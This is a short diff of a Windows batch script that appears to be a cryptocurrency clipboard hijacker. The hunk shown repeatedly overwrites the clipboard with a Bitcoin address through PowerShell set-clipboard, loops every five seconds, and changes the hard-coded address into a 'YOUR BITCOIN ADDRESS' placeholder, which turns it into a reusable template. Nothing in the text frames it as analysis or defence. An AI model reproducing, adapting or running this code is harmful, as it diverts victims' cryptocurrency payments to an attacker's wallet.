@@ -42,6 +42,6 @@ goto top
 
 ::changer
 :change
-powershell set-clipboard -Value "1GYUhVKZB49mhKKi34fFBhY5yPcJZDpCXm"
+powershell set-clipboard -Value "YOUR BITCOIN ADDRESS"
 timeout /t 5
 goto top
